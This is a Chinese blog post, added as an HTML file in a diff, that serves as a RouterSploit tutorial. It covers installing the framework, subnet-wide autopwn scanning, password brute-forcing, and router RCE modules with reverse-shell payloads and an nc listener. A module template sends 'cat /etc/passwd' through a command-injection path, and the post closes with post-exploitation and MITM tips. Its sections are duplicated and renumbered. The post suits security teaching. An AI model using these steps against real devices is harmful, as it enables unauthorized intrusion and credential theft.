@@ -1,0 +1,1168 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.com/binghey/blog/blob/main/%E6%89%A7%E8%A1%8C%E5%90%88%E4%B8%80%E7%AC%94%E8%AE%B0.png?raw=true"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="我们首先需要了解routersploit是什么，然后介绍其功能、安装、基本使用方法以及示例。">
+<meta property="og:title" content="routersploit工具详细介绍">
+<meta property="og:description" content="我们首先需要了解routersploit是什么，然后介绍其功能、安装、基本使用方法以及示例。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://binghey.github.io/blog/post/routersploit-gong-ju-xiang-xi-jie-shao.html">
+<meta property="og:image" content="https://github.com/binghey/blog/blob/main/%E6%89%A7%E8%A1%8C%E5%90%88%E4%B8%80%E7%AC%94%E8%AE%B0.png?raw=true">
+<title>routersploit工具详细介绍</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">routersploit工具详细介绍</h1>
+<div class="title-right">
+    <a href="https://binghey.github.io/blog" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/binghey/blog/issues/13" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p>我们首先需要了解routersploit是什么，然后介绍其功能、安装、基本使用方法以及示例。<br>
+注意：routersploit是一个开源的漏洞利用框架，专门用于嵌入式设备，尤其是路由器。它类似于Metasploit，但是针对路由器等网络设备。<br>
+由于该工具用于安全测试，务必在授权的情况下使用。</p>
+<p>好的，我们来对 <strong>RouterSploit</strong> 进行一次全面、详细的介绍。</p>
+<h3>一、什么是 RouterSploit？</h3>
+<p><strong>RouterSploit</strong> 是一个开源的、专用于嵌入式设备的漏洞利用框架。你可以把它理解为针对路由器、摄像头、智能家居设备等网络设备的 <strong>“Metasploit”</strong>。</p>
+<p>它的核心目的是自动化地检测和利用这些设备中存在的已知安全漏洞，是渗透测试人员和网络安全研究人员在进行安全评估时的强大工具。</p>
+<p><strong>项目主页：</strong> <a href="https://github.com/threat9/routersploit">https://github.com/threat9/routersploit</a></p>
+<hr>
+<h3>二、主要功能与模块</h3>
+<p>RouterSploit 采用了与 Metasploit 非常相似的模块化架构，这使得它功能强大且易于扩展。其主要模块分为以下几大类：</p>
+<ol>
+<li>
+<p><strong>扫描模块</strong></p>
+<ul>
+<li><strong>功能</strong>： 用于发现网络中的目标设备，并自动识别其制造商、型号、固件版本等信息。</li>
+<li><strong>举例</strong>： <code class="notranslate">scanners/autopwn</code> 是一个强大的自动扫描器，它可以自动运行多个漏洞检测模块来批量扫描一个IP范围。</li>
+</ul>
+</li>
+<li>
+<p><strong>Creds 模块</strong></p>
+<ul>
+<li><strong>功能</strong>： 专门用于对目标设备进行身份验证攻击，如暴力破解登录凭证（用户名/密码）。</li>
+<li><strong>举例</strong>： <code class="notranslate">creds/telnet_bruteforce</code>, <code class="notranslate">creds/ssh_bruteforce</code>, <code class="notranslate">creds/http_basic_default</code> 等。</li>
+</ul>
+</li>
+<li>
+<p><strong>漏洞利用模块</strong></p>
+<ul>
+<li><strong>功能</strong>： 这是框架的核心。它包含了大量针对特定设备型号和固件版本的已知漏洞的利用代码。</li>
+<li><strong>举例</strong>： 例如针对 D-Link, TP-Link, Netgear, Linksys 等主流品牌路由器的远程代码执行、权限提升等漏洞的利用。</li>
+</ul>
+</li>
+<li>
+<p><strong>Payloads 模块</strong></p>
+<ul>
+<li><strong>功能</strong>： 在漏洞成功利用后，用于生成和交付有效载荷（例如，反弹 Shell），以建立与攻击者的持续连接。</li>
+<li><strong>举例</strong>： 可以生成反向 TCP Shell、Meterpreter 等。</li>
+</ul>
+</li>
+<li>
+<p><strong>Generic 模块</strong></p>
+<ul>
+<li><strong>功能</strong>： 包含一些通用的攻击模块，不针对特定品牌或型号。</li>
+<li><strong>举例</strong>： <code class="notranslate">generic/http_backdoor</code> 用于测试简单的 HTTP 后门。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3>三、安装 RouterSploit</h3>
+<p>RouterSploit 基于 Python 3，推荐在 Kali Linux、Parrot OS 等渗透测试系统中运行，或者在其它 Linux 发行版、macOS 上安装。</p>
+<p><strong>方法一：使用 Kali Linux（最简单）</strong><br>
+Kali Linux 通常已经预装了 RouterSploit。你可以直接在终端中输入 <code class="notranslate">rsf</code> 来启动。</p>
+<p><strong>方法二：从 GitHub 源码安装</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 1. 克隆仓库</span>
+git clone https://www.github.com/threat9/routersploit
+
+<span class="pl-c"><span class="pl-c">#</span> 2. 进入目录</span>
+<span class="pl-c1">cd</span> routersploit
+
+<span class="pl-c"><span class="pl-c">#</span> 3. 安装依赖（强烈建议使用 Python 3）</span>
+pip3 install -r requirements.txt
+
+<span class="pl-c"><span class="pl-c">#</span> 4. 运行</span>
+python3 rsf.py</pre></div>
+<hr>
+<h3>四、基本使用流程与示例</h3>
+<p>启动后，你会看到一个 <code class="notranslate">rsf &gt;</code> 的提示符，这与 Metasploit 的 <code class="notranslate">msf6 &gt;</code> 非常相似。</p>
+<p><strong>示例：利用一个针对 TP-Link 路由器的漏洞</strong></p>
+<p>假设我们要测试一个目标 IP 为 <code class="notranslate">192.168.1.1</code> 的 TP-Link 路由器。</p>
+<ol>
+<li>
+<p><strong>启动并搜索模块</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 启动</span>
+python3 rsf.py
+
+rsf <span class="pl-k">&gt;</span> search tplink
+<span class="pl-c"><span class="pl-c">#</span> 这会列出所有与 TP-Link 相关的模块</span></pre></div>
+</li>
+<li>
+<p><strong>使用扫描模块（可选但推荐）</strong><br>
+首先，我们可以使用自动扫描来发现目标是否存在已知漏洞。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">rsf <span class="pl-k">&gt;</span> use scanners/autopwn
+rsf (Autopwn) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> target 192.168.1.1
+rsf (Autopwn) <span class="pl-k">&gt;</span> run</pre></div>
+<p>如果扫描器报告了相关漏洞，我们可以直接使用它建议的漏洞利用模块。</p>
+</li>
+<li>
+<p><strong>选择并使用漏洞利用模块</strong><br>
+假设我们通过搜索找到了一个针对 TP-Link Archer C60 的 RCE 漏洞。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">rsf <span class="pl-k">&gt;</span> use exploits/routers/tplink/archer_c60_rce</pre></div>
+</li>
+<li>
+<p><strong>设置选项</strong><br>
+使用 <code class="notranslate">show options</code> 查看需要设置的参数。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">rsf (TP-Link Archer C60 RCE) <span class="pl-k">&gt;</span> show options
+
+Target options:
+   Name       Current settings     Description
+   ----       ----------------     -----------
+   target     192.168.1.1          Target IP address
+   port       80                   Target port
+
+Module options:
+   Name          Current settings     Description
+   ----          ----------------     -----------
+   password      Admin                Password to login with (default: Admin)</pre></div>
+<p>设置目标地址：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">rsf (TP-Link Archer C60 RCE) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> target 192.168.1.1</pre></div>
+<p><em>注意：根据具体模块，可能还需要设置端口、密码等其他参数。</em></p>
+</li>
+<li>
+<p><strong>执行利用</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">rsf (TP-Link Archer C60 RCE) <span class="pl-k">&gt;</span> run</pre></div>
+<p>如果目标存在漏洞且配置正确，模块将执行攻击。成功后的结果可能是：</p>
+<ul>
+<li>获取到一个反向 Shell。</li>
+<li>执行一条系统命令并返回结果。</li>
+<li>返回一个证明漏洞存在的特定信息。</li>
+</ul>
+</li>
+<li>
+<p><strong>使用 Payload（如果需要）</strong><br>
+如果漏洞利用模块支持 Payload，你可以在执行前设置一个 Payload 来建立更稳固的连接。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">rsf (TP-Link Archer C60 RCE) <span class="pl-k">&gt;</span> show payloads
+rsf (TP-Link Archer C60 RCE) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> payload reverse_tcp
+rsf (TP-Link Archer C60 RCE) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> lhost 192.168.1.100 <span class="pl-c"><span class="pl-c">#</span> 你的攻击机IP</span>
+rsf (TP-Link Archer C60 RCE) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> lport 4444 <span class="pl-c"><span class="pl-c">#</span> 监听端口</span>
+rsf (TP-Link Archer C60 RCE) <span class="pl-k">&gt;</span> run</pre></div>
+<p>在执行前，别忘了在你的攻击机上使用 <code class="notranslate">nc -lvnp 4444</code> 启动监听。</p>
+</li>
+</ol>
+<hr>
+<h3>五、优势与局限性</h3>
+<p><strong>优势：</strong></p>
+<ul>
+<li><strong>高度专业化</strong>： 专注于一个容易被忽视但极其重要的攻击面——嵌入式设备。</li>
+<li><strong>自动化程度高</strong>： 自动扫描和利用功能大大提高了测试效率。</li>
+<li><strong>模块化设计</strong>： 易于社区贡献新的漏洞利用模块。</li>
+<li><strong>免费开源</strong>： 任何人都可以免费使用、研究和学习。</li>
+</ul>
+<p><strong>局限性：</strong></p>
+<ul>
+<li><strong>依赖已知漏洞</strong>： 主要针对已公开的 CVE 漏洞，对零日漏洞无能为力。</li>
+<li><strong>可能造成设备崩溃</strong>： 某些利用模块具有攻击性，可能导致目标设备重启或变砖。</li>
+<li><strong>误报可能</strong>： 自动化工具无法保证 100% 准确，可能存在误报。</li>
+</ul>
+<hr>
+<h3>六、法律与道德警告</h3>
+<p><strong>非常重要！</strong></p>
+<ul>
+<li><strong>仅用于授权测试</strong>： 你只能在你自己拥有或已获得明确书面授权进行测试的设备上使用 RouterSploit。</li>
+<li><strong>遵守法律法规</strong>： 未经授权对他人网络和设备进行扫描和攻击是违法行为，后果严重。</li>
+<li><strong>用于学习与研究</strong>： 将其视为一个宝贵的学习工具，用于理解物联网设备的安全风险和提高防御能力。</li>
+</ul>
+<h3>总结</h3>
+<p>RouterSploit 是网络安全领域，特别是 IoT/嵌入式设备安全评估中一款不可或缺的专业工具。它将分散的漏洞利用代码整合到一个统一的框架下，极大地简化了测试流程。对于安全从业者来说，掌握 RouterSploit 有助于更好地发现和修复网络中的薄弱环节，从而提升整体网络安全性。</p>
+<p>我们继续深入探讨RouterSploit的更多细节和高级用法。</p>
+<p>七、高级用法与技巧<br>
+批量扫描<br>
+在实际渗透测试中，我们经常需要扫描整个网段。可以使用scanners/autopwn模块并设置一个IP范围。</p>
+<p>bash<br>
+rsf &gt; use scanners/autopwn<br>
+rsf (Autopwn) &gt; set target 192.168.1.0/24<br>
+rsf (Autopwn) &gt; run<br>
+这将对192.168.1.0/24网段内的所有IP进行扫描，并尝试所有可用的漏洞利用模块。</p>
+<p>使用自定义端口<br>
+有些设备可能将服务端口改为非标准端口，例如将HTTP服务从80端口改为8080。在设置目标时，需要相应修改端口。</p>
+<p>bash<br>
+rsf &gt; use exploits/routers/tplink/archer_c60_rce<br>
+rsf (TP-Link Archer C60 RCE) &gt; set target 192.168.1.1<br>
+rsf (TP-Link Archer C60 RCE) &gt; set port 8080<br>
+使用代理<br>
+如果你需要通过代理进行测试，可以在启动rsf时设置HTTP代理环境变量。</p>
+<p>bash<br>
+export HTTP_PROXY=<a href="http://proxy.example.com:8080" rel="nofollow">http://proxy.example.com:8080</a><br>
+export HTTPS_PROXY=<a href="http://proxy.example.com:8080" rel="nofollow">http://proxy.example.com:8080</a><br>
+python3 rsf.py<br>
+模块开发<br>
+RouterSploit的模块结构清晰，如果你发现了一个新的漏洞，可以为其编写模块并贡献给社区。</p>
+<p>模块通常位于routersploit/modules/下的相应子目录中。</p>
+<p>你可以参考现有模块的编写方式，例如exploits/routers/tplink/archer_c60_rce.py。</p>
+<p>一个简单的漏洞利用模块通常包括以下部分：</p>
+<p>模块信息（名称、描述、作者、参考等）</p>
+<p>需要设置的选项（如目标、端口等）</p>
+<p>check方法：用于验证目标是否存在漏洞（可选但推荐）</p>
+<p>run方法：执行漏洞利用</p>
+<p>交互式Shell的使用<br>
+当利用成功并获取到一个Shell后，你可能会遇到交互式Shell。此时，你可以执行系统命令来进一步渗透，例如：</p>
+<p>查看网络配置：ifconfig 或 ip addr</p>
+<p>查看用户信息：cat /etc/passwd</p>
+<p>下载文件：使用wget或curl将文件传输到你的服务器</p>
+<p>提权：尝试使用系统已知的本地提权漏洞</p>
+<p>八、常见问题与解决方法<br>
+依赖安装失败</p>
+<p>确保使用的是Python 3.6或更高版本。</p>
+<p>尝试使用pip3而不是pip。</p>
+<p>如果遇到编译错误，可能需要安装Python开发工具和一些库。在Ubuntu上，可以尝试：sudo apt-get install build-essential python3-dev libffi-dev libssl-dev</p>
+<p>模块执行失败</p>
+<p>检查目标地址和端口是否正确。</p>
+<p>确认目标设备型号和固件版本是否与模块要求匹配。</p>
+<p>查看模块的说明，有时需要特定的凭证（如默认密码）才能利用。</p>
+<p>如何更新RouterSploit</p>
+<p>由于是通过Git克隆的，可以进入routersploit目录并执行：</p>
+<p>bash<br>
+git pull<br>
+pip3 install -r requirements.txt<br>
+九、防御措施<br>
+作为网络管理员，如何防御RouterSploit所利用的漏洞？</p>
+<p>及时更新固件：定期检查设备制造商的官网，更新到最新固件。</p>
+<p>更改默认凭证：为设备设置强密码，避免使用默认用户名和密码。</p>
+<p>禁用远程管理：如果不需要从外网管理设备，请禁用远程管理功能。</p>
+<p>网络分段：将IoT设备划分到独立的VLAN中，限制它们与内部重要网络的通信。</p>
+<p>定期安全评估：使用类似RouterSploit的工具（在授权范围内）定期检查自身网络的安全状况。</p>
+<p>十、总结<br>
+RouterSploit是一个功能强大的IoT设备漏洞利用框架，它简化了针对嵌入式设备的漏洞检测和利用过程。通过模块化的设计，它能够快速集成新的漏洞利用代码，并且提供了自动扫描功能，使得大规模评估成为可能。</p>
+<p>对于安全研究人员和渗透测试人员来说，RouterSploit是一个必不可少的工具。同时，对于网络管理员和IoT设备用户，了解RouterSploit的功能和利用方式也有助于更好地保护自己的设备。</p>
+<p>请始终牢记：仅在合法授权的范围内使用该工具，并遵守相关法律法规。</p>
+<p>好的，我们继续深入探讨 RouterSploit 的更多高级特性和实际应用场景。</p>
+<p>好的，我们继续深入探讨 RouterSploit 的更多高级特性和实际应用场景。</p>
+<hr>
+<h3>七、高级用法与技巧</h3>
+<h4>1. 使用 <code class="notranslate">autopwn</code> 扫描器进行大规模评估</h4>
+<p><code class="notranslate">autopwn</code> 是 RouterSploit 中最强大的扫描模块之一，它可以自动化地对整个网段进行漏洞扫描。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">rsf <span class="pl-k">&gt;</span> use scanners/autopwn
+rsf (Autopwn) <span class="pl-k">&gt;</span> show options
+
+<span class="pl-c"><span class="pl-c">#</span> 设置目标网段</span>
+rsf (Autopwn) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> target 192.168.1.0/24
+
+<span class="pl-c"><span class="pl-c">#</span> 设置线程数（提高扫描速度）</span>
+rsf (Autopwn) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> threads 10
+
+<span class="pl-c"><span class="pl-c">#</span> 执行扫描</span>
+rsf (Autopwn) <span class="pl-k">&gt;</span> run</pre></div>
+<p>扫描完成后，<code class="notranslate">autopwn</code> 会列出所有发现的存在漏洞的设备，并显示可用的利用模块。</p>
+<h4>2. 暴力破解凭证</h4>
+<p>当默认口令无效时，可以使用暴力破解模块：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 使用 HTTP 基础认证暴力破解</span>
+rsf <span class="pl-k">&gt;</span> use creds/http_basic_bruteforce
+rsf (HTTP Basic Bruteforce) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> target 192.168.1.1
+rsf (HTTP Basic Bruteforce) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> port 80
+
+<span class="pl-c"><span class="pl-c">#</span> 设置用户名和密码字典</span>
+rsf (HTTP Basic Bruteforce) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> username admin
+rsf (HTTP Basic Bruteforce) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> passwords_file /usr/share/wordlists/rockyou.txt
+
+<span class="pl-c"><span class="pl-c">#</span> 执行破解</span>
+rsf (HTTP Basic Bruteforce) <span class="pl-k">&gt;</span> run</pre></div>
+<h4>3. 自定义 Payload 和反向连接</h4>
+<p>对于需要建立持久访问的情况：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">rsf <span class="pl-k">&gt;</span> use exploits/routers/dlink/dir_8xx_remote_code_execution
+rsf (D-Link DIR-8XX RCE) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> target 192.168.1.1
+rsf (D-Link DIR-8XX RCE) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> payload reverse_tcp
+
+<span class="pl-c"><span class="pl-c">#</span> 设置监听器信息</span>
+rsf (D-Link DIR-8XX RCE) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> lhost 192.168.1.100  <span class="pl-c"><span class="pl-c">#</span> 你的IP</span>
+rsf (D-Link DIR-8XX RCE) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> lport 4444
+
+<span class="pl-c"><span class="pl-c">#</span> 在执行前，在另一个终端启动监听</span>
+<span class="pl-c"><span class="pl-c">#</span> nc -nvlp 4444</span>
+
+rsf (D-Link DIR-8XX RCE) <span class="pl-k">&gt;</span> run</pre></div>
+<h4>4. 模块开发基础</h4>
+<p>RouterSploit 的模块结构相对简单。一个基本的漏洞利用模块包含：</p>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">from</span> <span class="pl-s1">routersploit</span>.<span class="pl-s1">core</span>.<span class="pl-s1">exploit</span> <span class="pl-k">import</span> <span class="pl-c1">*</span>
+<span class="pl-k">from</span> <span class="pl-s1">routersploit</span>.<span class="pl-s1">core</span>.<span class="pl-s1">http</span>.<span class="pl-s1">http_client</span> <span class="pl-k">import</span> <span class="pl-v">HTTPClient</span>
+
+<span class="pl-k">class</span> <span class="pl-v">Exploit</span>(<span class="pl-v">HTTPClient</span>):
+    <span class="pl-s1">__info__</span> <span class="pl-c1">=</span> {
+        <span class="pl-s">"name"</span>: <span class="pl-s">"Example Router RCE"</span>,
+        <span class="pl-s">"description"</span>: <span class="pl-s">"Exploit description here"</span>,
+        <span class="pl-s">"authors"</span>: (<span class="pl-s">"YourName"</span>,),
+        <span class="pl-s">"references"</span>: (<span class="pl-s">"CVE-2020-XXXXX"</span>,),
+        <span class="pl-s">"devices"</span>: (<span class="pl-s">"Vendor Model"</span>,)
+    }
+    
+    <span class="pl-s1">target</span> <span class="pl-c1">=</span> <span class="pl-en">OptIP</span>(<span class="pl-s">""</span>, <span class="pl-s">"Target IP address"</span>)
+    <span class="pl-s1">port</span> <span class="pl-c1">=</span> <span class="pl-en">OptPort</span>(<span class="pl-c1">80</span>, <span class="pl-s">"Target HTTP port"</span>)
+    
+    <span class="pl-k">def</span> <span class="pl-en">run</span>(<span class="pl-s1">self</span>):
+        <span class="pl-c"># 漏洞利用逻辑在这里实现</span>
+        <span class="pl-k">if</span> <span class="pl-s1">self</span>.<span class="pl-c1">check</span>():
+            <span class="pl-en">print_success</span>(<span class="pl-s">"Target is vulnerable!"</span>)
+            <span class="pl-c"># 执行利用代码...</span>
+        <span class="pl-k">else</span>:
+            <span class="pl-en">print_error</span>(<span class="pl-s">"Target is not vulnerable"</span>)
+    
+    <span class="pl-k">def</span> <span class="pl-en">check</span>(<span class="pl-s1">self</span>):
+        <span class="pl-c"># 漏洞验证逻辑</span>
+        <span class="pl-k">return</span> <span class="pl-c1">True</span>  <span class="pl-c"># 或 False</span></pre></div>
+<hr>
+<h3>八、实际渗透测试场景中的应用</h3>
+<h4>场景1：内部网络安全评估</h4>
+<p>作为红队成员，在获得授权后对客户内网进行测试：</p>
+<ol>
+<li>使用 <code class="notranslate">autopwn</code> 快速扫描整个网段，识别存在已知漏洞的网络设备</li>
+<li>对发现的漏洞设备进行验证性利用</li>
+<li>获取设备控制权后，尝试横向移动（如提取保存的密码、ARP欺骗等）</li>
+</ol>
+<h4>场景2：无线网络安全测试</h4>
+<p>在对企业无线网络进行测试时：</p>
+<ol>
+<li>连接到目标WiFi网络（或通过其他方式接入）</li>
+<li>扫描网关路由器IP（通常是 <code class="notranslate">192.168.0.1</code> 或 <code class="notranslate">192.168.1.1</code>）</li>
+<li>使用 RouterSploit 测试路由器安全性</li>
+<li>如果成功控制路由器，可以实施中间人攻击、流量监控等</li>
+</ol>
+<h4>场景3：IoT设备安全研究</h4>
+<p>安全研究人员分析智能设备：</p>
+<ol>
+<li>在隔离的测试环境中搭建目标设备</li>
+<li>使用 RouterSploit 的系统性方法进行安全测试</li>
+<li>发现新漏洞后，可以编写相应的模块贡献给社区</li>
+</ol>
+<hr>
+<h3>九、防御措施与最佳实践</h3>
+<h4>针对企业的防御策略：</h4>
+<ol>
+<li>
+<p><strong>资产管理</strong></p>
+<ul>
+<li>维护所有网络设备的详细清单</li>
+<li>记录设备型号、固件版本和位置</li>
+</ul>
+</li>
+<li>
+<p><strong>补丁管理</strong></p>
+<ul>
+<li>建立定期的固件更新流程</li>
+<li>订阅设备厂商的安全公告</li>
+<li>及时应用安全补丁</li>
+</ul>
+</li>
+<li>
+<p><strong>网络分段</strong></p>
+<ul>
+<li>将IoT设备隔离到独立的VLAN</li>
+<li>限制对管理界面的访问（仅限管理网络）</li>
+<li>实施严格的网络访问控制策略</li>
+</ul>
+</li>
+<li>
+<p><strong>强化配置</strong></p>
+<ul>
+<li>更改所有默认凭证</li>
+<li>禁用不必要的服务（如远程管理、UPnP等）</li>
+<li>启用自动注销和登录失败锁定</li>
+</ul>
+</li>
+<li>
+<p><strong>持续监控</strong></p>
+<ul>
+<li>监控网络中的异常扫描活动</li>
+<li>部署IDS/IPS检测利用尝试</li>
+<li>定期进行安全评估和渗透测试</li>
+</ul>
+</li>
+</ol>
+<h4>针对家庭用户的建议：</h4>
+<ul>
+<li>定期检查并更新路由器固件</li>
+<li>使用强密码替换默认管理员密码</li>
+<li>禁用WPS和远程管理功能</li>
+<li>启用防火墙和MAC地址过滤</li>
+<li>定期重启设备并检查异常连接</li>
+</ul>
+<hr>
+<h3>十、相关工具与生态</h3>
+<p>RouterSploit 不是唯一的选择，其他相关工具包括：</p>
+<ol>
+<li><strong>Metasploit</strong> - 更通用的渗透测试框架，包含部分IoT模块</li>
+<li><strong>IoTGoat</strong> - 故意设计有漏洞的IoT设备固件，用于学习</li>
+<li><strong>Firmware Analysis Toolkit (FAT)</strong> - 固件分析工具</li>
+<li><strong>Binwalk</strong> - 固件提取和分析工具</li>
+<li><strong>Burp Suite</strong> - 用于测试Web管理界面的安全性</li>
+</ol>
+<hr>
+<h3>十一、发展趋势与未来展望</h3>
+<p>RouterSploit 和类似工具的发展反映了IoT安全领域的几个重要趋势：</p>
+<ol>
+<li><strong>自动化程度提高</strong> - 工具越来越智能，能够自动识别设备并选择适当的攻击向量</li>
+<li><strong>云集成</strong> - 部分工具开始集成云漏洞数据库，实时更新检测能力</li>
+<li><strong>防御集成</strong> - 攻击工具的技术正被整合到防御产品中，形成主动防御能力</li>
+<li><strong>法规推动</strong> - 随着物联网安全法规的出台，这类工具在合规测试中的作用日益重要</li>
+</ol>
+<h3>总结</h3>
+<p>RouterSploit 代表了现代网络安全的一个重要方向：针对特定威胁面的专业化工具。它的价值不仅在于攻击能力，更在于：</p>
+<ul>
+<li><strong>提高安全意识</strong> - 展示了嵌入式设备的安全脆弱性</li>
+<li><strong>促进漏洞修复</strong> - 为厂商和安全研究人员提供了验证工具</li>
+<li><strong>教育价值</strong> - 是学习IoT安全的绝佳实践平台</li>
+<li><strong>防御验证</strong> - 帮助组织验证其安全控制的有效性</li>
+</ul>
+<p>正如双刃剑，这类工具的使用完全取决于使用者的意图。在合法、道德的前提下，RouterSploit 是提升整个生态系统安全水平的重要工具。</p>
+<p>我们继续深入探讨RouterSploit的更多细节，包括其模块开发、高级使用技巧以及在实际渗透测试中的综合应用。</p>
+<p>十二、RouterSploit模块开发详解<br>
+如果你想为RouterSploit贡献新的漏洞利用模块，或者为自己研究的漏洞编写利用代码，可以按照以下步骤进行。</p>
+<ol>
+<li>模块结构<br>
+一个典型的漏洞利用模块通常包括以下部分：</li>
+</ol>
+<p>元数据（info）：提供模块的基本信息。</p>
+<p>选项（OptIP、OptPort等）：定义模块需要的参数。</p>
+<p>检查方法（check）：验证目标是否存在漏洞。</p>
+<p>运行方法（run）：执行漏洞利用。</p>
+<ol start="2">
+<li>编写示例<br>
+以下是一个简单的HTTP漏洞利用模块的模板：<br>
+from routersploit.core.exploit import *<br>
+from routersploit.core.http.http_client import HTTPClient</li>
+</ol>
+<p>class Exploit(HTTPClient):<br>
+<strong>info</strong> = {<br>
+"name": "Sample HTTP RCE",<br>
+"description": "This module exploits a remote code execution vulnerability in Sample Device.",<br>
+"authors": ("YourName",),<br>
+"references": (<br>
+"CVE-YYYY-XXXXX",<br>
+"URL to advisory"<br>
+),<br>
+"devices": (<br>
+"Vendor Model Version",<br>
+),<br>
+}</p>
+<pre class="notranslate"><code class="notranslate">target = OptIP("", "Target IP address")
+port = OptPort(80, "Target HTTP port")
+
+def __init__(self):
+    self.vuln_path = "/cgi-bin/command"
+
+def check(self):
+    # 检查目标是否脆弱
+    mark = utils.random_text(6)
+    command = "echo {}".format(mark)
+    data = {
+        "cmd": command
+    }
+
+    response = self.http_request(
+        method="POST",
+        path=self.vuln_path,
+        data=data
+    )
+
+    if response is None:
+        return False
+
+    if mark in response.text:
+        return True
+
+    return False
+
+def run(self):
+    if self.check():
+        print_success("Target is vulnerable")
+        # 利用漏洞，例如执行命令
+        command = "cat /etc/passwd"
+        data = {
+            "cmd": command
+        }
+        response = self.http_request(
+            method="POST",
+            path=self.vuln_path,
+            data=data
+        )
+        if response is None:
+            print_error("Exploit failed")
+            return
+        print_info("Response: {}".format(response.text))
+    else:
+        print_error("Target is not vulnerable")
+</code></pre>
+<ol start="3">
+<li>模块放置<br>
+将编写好的模块放在合适的目录下，例如 routersploit/modules/exploits/routers/vendor/ 中。</li>
+</ol>
+<p>十三、高级使用技巧</p>
+<ol>
+<li>使用资源文件<br>
+可以编写资源脚本来自动化一系列命令，类似于Metasploit的resource文件。</li>
+</ol>
+<p>例如，创建一个 test.rc 文件：</p>
+<p>text<br>
+use scanners/autopwn<br>
+set target 192.168.1.0/24<br>
+run<br>
+然后通过标准输入执行：</p>
+<p>bash<br>
+python3 rsf.py &lt; test.rc<br>
+2. 集成到其他工具<br>
+由于RouterSploit是Python库，你可以将其集成到自己的Python脚本中。</p>
+<p>python<br>
+from routersploit.core.exploit import exploits<br>
+from routersploit.core.exploit.option import OptString</p>
+<h1>加载特定模块</h1>
+<p>exploit = exploits().get_exploit("routers/tplink/archer_c60_rce")<br>
+exploit.target = "192.168.1.1"<br>
+exploit.port = 80<br>
+exploit.run()<br>
+3. 调试模块<br>
+如果模块运行不正常，可以启用调试输出：</p>
+<p>bash<br>
+rsf &gt; set verbosity true<br>
+rsf &gt; use exploits/your_module<br>
+rsf (Your Module) &gt; run<br>
+十四、实际渗透测试案例<br>
+假设我们正在对一个企业的网络进行渗透测试，并且已经获取了内部网络访问权限。</p>
+<p>步骤1：发现网络设备<br>
+使用nmap扫描网络，发现潜在的路由器、交换机等设备。</p>
+<p>bash<br>
+nmap -sS -p 80,443,22,23 192.168.1.0/24<br>
